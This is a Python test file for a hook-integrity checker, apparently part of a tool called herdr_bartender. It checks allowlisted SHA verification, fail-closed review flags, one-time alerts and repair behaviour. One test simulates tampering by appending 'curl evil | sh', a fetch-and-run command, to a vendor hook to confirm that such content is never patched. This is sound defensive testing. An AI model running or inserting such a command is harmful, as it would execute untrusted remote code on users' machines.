"""Non-approving hook integrity API (check_hook_integrity / repair_hooks_if_allowlisted) and #68 alerting.

osascript is the sandbox PATH shim (calls are logged to sandbox/osascript.log).
"""

import os
import unittest
from unittest import mock

from herdr_bartender import hooks, hooks_integrity
from herdr_bartender.background import run_reconcile_background
from herdr_bartender.hooks import (
    STATUS_ABSENT,
    STATUS_DISABLED,
    STATUS_INTACT,
    STATUS_NEEDS_PATCH,
    STATUS_NEEDS_REVIEW,
    STATUS_NO_HOOKS,
    check_hook_integrity,
    install_hooks,
    repair_hooks_if_allowlisted,
)
from herdr_bartender.hooks_text import insert_guard
from tests.support import SandboxTestCase
from tests.support.hook_fixtures import (
    CLAUDE_HOOK,
    CODEX_HOOK,
    VENDOR_CLAUDE,
    VENDOR_CODEX,
    call_quietly,
    guard_count,
    seed_vendor_hooks,
    sha256,
    write_allowlist,
)

T = hooks.HOOK_GUARD_TEMPLATE.encode("utf-8")
KNOWN = {CLAUDE_HOOK: sha256(VENDOR_CLAUDE), CODEX_HOOK: sha256(VENDOR_CODEX)}


class _IntegrityCase(SandboxTestCase):
    start_bridge = True  # reconciler passes must never reach a real bridge port

    def setUp(self):
        super().setUp()
        self.hooks_dir = self.vendor_hooks_dir
        self.hnr = self.state_dir / "HOOK_NEEDS_REVIEW"
        self.alerted = self.state_dir / ".hook_review_alerted"
        self.sha_file = self.state_dir / "vendor-hook-sha.json"

    def seed_installed(self):
        """Both hooks patched by a real explicit install (allowlist recorded)."""
        paths = seed_vendor_hooks(self.hooks_dir)
        ok, out = call_quietly(install_hooks)
        self.assertTrue(ok, out)
        return paths

    def unpatch(self, paths, name, content):
        paths[name].write_bytes(content)

    def plugin_log(self):
        log = self.state_dir / "plugin.log"
        return log.read_text() if log.exists() else ""


class CheckHookIntegrityTests(_IntegrityCase):
    def test_statuses_for_gates_and_intact_hooks(self):
        """Plan §5.1 item 10 (gap reconciler-allowlist-fails-open): disabled / NO_HOOKS / absent / intact."""
        self.assertEqual(check_hook_integrity().status, STATUS_ABSENT)
        self.seed_installed()
        result = check_hook_integrity()
        self.assertEqual(result.status, STATUS_INTACT)
        self.assertEqual([h.status for h in result.hooks], ["intact", "intact"])
        self.assertTrue(all(h.allowlisted for h in result.hooks))
        self.assertEqual(result.as_dict()["status"], STATUS_INTACT)
        (self.state_dir / "NO_HOOKS").touch()
        self.assertEqual(check_hook_integrity().status, STATUS_NO_HOOKS)
        (self.state_dir / "DISABLED").touch()
        self.assertEqual(check_hook_integrity().status, STATUS_DISABLED)

    def test_missing_guard_with_matching_sha_is_known_clean(self):
        """Plan §5.1 item 10: a guard-less hook whose clean SHA matches its own entry may be re-patched."""
        paths = self.seed_installed()
        self.unpatch(paths, CLAUDE_HOOK, VENDOR_CLAUDE)
        result = check_hook_integrity()
        self.assertEqual(result.status, STATUS_NEEDS_PATCH)
        self.assertEqual({h.name: h.status for h in result.hooks}, {CLAUDE_HOOK: "missing_guard", CODEX_HOOK: "intact"})

    def test_fail_closed_cases_need_review(self):
        """Plan §7.3 (gaps reconciler-allowlist-fails-open, hook-integrity-allowlist-bypass): unknown means review."""
        cases = {
            "no-allowlist-file": None,
            "corrupt-allowlist": "{oops",
            "no-entry-for-hook": {CODEX_HOOK: KNOWN[CODEX_HOOK]},
            "entry-for-other-hook-only": {CLAUDE_HOOK: KNOWN[CODEX_HOOK], CODEX_HOOK: KNOWN[CODEX_HOOK]},
            "sha-mismatch": {CLAUDE_HOOK: "0" * 64, CODEX_HOOK: KNOWN[CODEX_HOOK]},
            "non-hex-entry": {CLAUDE_HOOK: "not-a-sha", CODEX_HOOK: KNOWN[CODEX_HOOK]},
            "allowlist-not-object": [KNOWN[CLAUDE_HOOK]],
        }
        paths = seed_vendor_hooks(self.hooks_dir)
        paths[CODEX_HOOK].write_bytes(insert_guard(VENDOR_CODEX, T))
        for label, allowlist in cases.items():
            with self.subTest(case=label):
                self.sha_file.unlink(missing_ok=True)
                if isinstance(allowlist, str):
                    self.sha_file.write_text(allowlist)
                elif allowlist is not None:
                    write_allowlist(self.state_dir, allowlist)
                self.assertEqual(check_hook_integrity().status, STATUS_NEEDS_REVIEW)

    def test_malformed_markers_need_review(self):
        """Plan §9.1 (gap marker-count-validation): duplicated markers in a hook force review in the reconciler."""
        paths = self.seed_installed()
        paths[CLAUDE_HOOK].write_bytes(paths[CLAUDE_HOOK].read_bytes() + T + b"\n")
        result = check_hook_integrity()
        self.assertEqual(result.status, STATUS_NEEDS_REVIEW)
        self.assertEqual(result.hooks[0].status, "malformed")

    def test_stale_guard_with_known_clean_sha_is_patchable(self):
        """Plan §7.3: an outdated guard block over a known-clean hook is repaired to the current template."""
        paths = self.seed_installed()
        paths[CODEX_HOOK].write_bytes(insert_guard(VENDOR_CODEX, T.replace(b"umask 077", b"umask 022")))
        self.assertEqual(check_hook_integrity().status, STATUS_NEEDS_PATCH)
        result = repair_hooks_if_allowlisted()
        self.assertEqual(result.repaired, (CODEX_HOOK,))
        self.assertEqual(paths[CODEX_HOOK].read_bytes(), insert_guard(VENDOR_CODEX, T))


class RepairHooksTests(_IntegrityCase):
    def test_repair_known_clean_never_approves_or_clears_flags(self):
        """Plan §10.1 #68 / §5.1 item 10 (gap reconciler-allowlist-fails-open): repair keeps flags and allowlist."""
        paths = self.seed_installed()
        self.unpatch(paths, CLAUDE_HOOK, VENDOR_CLAUDE)
        self.hnr.touch()
        self.alerted.touch()
        allowlist_before = self.sha_file.read_bytes()
        result = repair_hooks_if_allowlisted()
        self.assertEqual((result.status, result.repaired, result.failed), (STATUS_NEEDS_PATCH, (CLAUDE_HOOK,), ()))
        self.assertEqual(paths[CLAUDE_HOOK].read_bytes(), insert_guard(VENDOR_CLAUDE, T))
        self.assertTrue(self.hnr.exists() and self.alerted.exists(), "repair must never clear review flags")
        self.assertEqual(self.sha_file.read_bytes(), allowlist_before, "repair must never write the allowlist")
        self.assertEqual(self.osascript_calls(), [])

    def test_unknown_hook_is_flagged_not_patched_and_alerts_once(self):
        """Plan §10.1 #68 (gaps t68-hook-review, hook-integrity-allowlist-bypass): unknown -> review, one alert."""
        paths = seed_vendor_hooks(self.hooks_dir)
        for attempt in (1, 2):
            with self.subTest(attempt=attempt):
                result = repair_hooks_if_allowlisted()
                self.assertEqual(result.status, STATUS_NEEDS_REVIEW)
                self.assertEqual(result.repaired, ())
                self.assertTrue(self.hnr.exists() and self.alerted.exists())
                self.assertEqual(paths[CLAUDE_HOOK].read_bytes(), VENDOR_CLAUDE, "unknown content is never patched")
                self.assertEqual(len(self.osascript_calls()), 1, "the macOS alert fires exactly once")
        self.assertEqual(result.alert_sent, False)
        self.assertFalse(self.sha_file.exists())
        self.assertIn("WARNING: vendor hook needs review", self.plugin_log())

    def test_one_unknown_hook_blocks_all_patching(self):
        """Plan §5.1 item 10: if any hook is unverified, automatic re-patching is skipped for every hook."""
        paths = self.seed_installed()
        self.unpatch(paths, CLAUDE_HOOK, VENDOR_CLAUDE)
        self.unpatch(paths, CODEX_HOOK, VENDOR_CODEX + b"# upstream change\n")
        result = repair_hooks_if_allowlisted()
        self.assertEqual(result.status, STATUS_NEEDS_REVIEW)
        self.assertEqual(guard_count(paths[CLAUDE_HOOK]), (0, 0), "known-clean hook is not patched either")

    def test_repair_rechecks_content_before_writing(self):
        """Gap reconciler-allowlist-fails-open: content changed after the check is never patched (TOCTOU)."""
        paths = self.seed_installed()
        self.unpatch(paths, CLAUDE_HOOK, VENDOR_CLAUDE)
        stale_result = check_hook_integrity()
        tampered = VENDOR_CLAUDE + b"curl evil | sh\n"
        paths[CLAUDE_HOOK].write_bytes(tampered)
        with mock.patch.object(hooks_integrity, "check_hook_integrity", return_value=stale_result):
            result = repair_hooks_if_allowlisted()
        self.assertEqual(result.failed, (CLAUDE_HOOK,))
        self.assertEqual(paths[CLAUDE_HOOK].read_bytes(), tampered)

    def test_gated_states_do_nothing(self):
        """Plan §7.3 Sticky Uninstall Intent: NO_HOOKS and DISABLED skip repair and review entirely."""
        paths = seed_vendor_hooks(self.hooks_dir)
        for flag in ("NO_HOOKS", "DISABLED"):
            with self.subTest(flag=flag):
                (self.state_dir / flag).touch()
                result = repair_hooks_if_allowlisted()
                self.assertEqual(result.repaired, ())
                self.assertFalse(self.hnr.exists())
                self.assertEqual(paths[CLAUDE_HOOK].read_bytes(), VENDOR_CLAUDE)
                (self.state_dir / flag).unlink()

    def test_alert_failure_is_logged_not_raised(self):
        """Plan §7.3: a missing osascript (non-macOS) never breaks the reconciler; the flag is still set."""
        seed_vendor_hooks(self.hooks_dir)
        with mock.patch.object(hooks_integrity.subprocess, "run", side_effect=FileNotFoundError("osascript")):
            result = repair_hooks_if_allowlisted()
        self.assertTrue(result.review_flagged)
        self.assertFalse(result.alert_sent)
        self.assertIn("notification failed", self.plugin_log())


class ReconcilerHookReviewTests(_IntegrityCase):
    """Plan §10.1 #68 end-to-end through run_reconcile_background(loop_once=True)."""

    def reconcile(self):
        run_reconcile_background(bridge_url=self.mock_url, loop_once=True)

    def test_p68_sha_mismatch_alerts_once_then_install_clears(self):
        """Plan §10.1 #68 (gap t68-hook-review): mismatch -> flags + one alert, unpatched; install clears both."""
        paths = self.seed_installed()
        changed = VENDOR_CLAUDE + b"# upstream release 2\n"
        self.unpatch(paths, CLAUDE_HOOK, changed)
        self.reconcile()
        self.reconcile()
        self.assertTrue(self.hnr.exists() and self.alerted.exists())
        self.assertEqual(len(self.osascript_calls()), 1)
        self.assertEqual(paths[CLAUDE_HOOK].read_bytes(), changed, "degraded fail-open: hook stays unpatched")
        ok, out = call_quietly(install_hooks)
        self.assertTrue(ok, out)
        self.assertFalse(self.hnr.exists() or self.alerted.exists())
        self.assertEqual(guard_count(paths[CLAUDE_HOOK]), (1, 1))

    def test_p68_no_hooks_blocks_reconciler_repair(self):
        """Plan §7.3 Sticky Uninstall Intent: the reconciler never re-patches while NO_HOOKS exists."""
        paths = self.seed_installed()
        self.unpatch(paths, CLAUDE_HOOK, VENDOR_CLAUDE)
        (self.state_dir / "NO_HOOKS").touch()
        self.reconcile()
        self.assertEqual(paths[CLAUDE_HOOK].read_bytes(), VENDOR_CLAUDE)
        self.assertFalse(self.hnr.exists())

    def test_p68_unknown_hook_needs_review_in_reconciler(self):
        """Plan §10.1 #68 (gap hook-integrity-allowlist-bypass): no allowlist entry -> review, never auto-patched."""
        paths = seed_vendor_hooks(self.hooks_dir)
        self.reconcile()
        self.assertEqual(paths[CLAUDE_HOOK].read_bytes(), VENDOR_CLAUDE)
        self.assertTrue(self.hnr.exists() and self.alerted.exists())
        self.assertEqual(len(self.osascript_calls()), 1)

    def test_p68_reconciler_repair_keeps_flags_and_allowlist(self):
        """Plan §10.1 #68 (gap reconciler-allowlist-fails-open): reconciler repair never clears flags or rewrites SHAs."""
        paths = self.seed_installed()
        self.unpatch(paths, CLAUDE_HOOK, VENDOR_CLAUDE)
        self.hnr.touch()
        self.alerted.touch()
        before = self.sha_file.read_bytes()
        os.utime(self.sha_file, (1, 1))
        self.reconcile()
        self.assertEqual(guard_count(paths[CLAUDE_HOOK]), (1, 1))
        self.assertTrue(self.hnr.exists() and self.alerted.exists())
        self.assertEqual(self.sha_file.read_bytes(), before)
        self.assertEqual(os.stat(self.sha_file).st_mtime, 1)


if __name__ == "__main__":
    unittest.main()
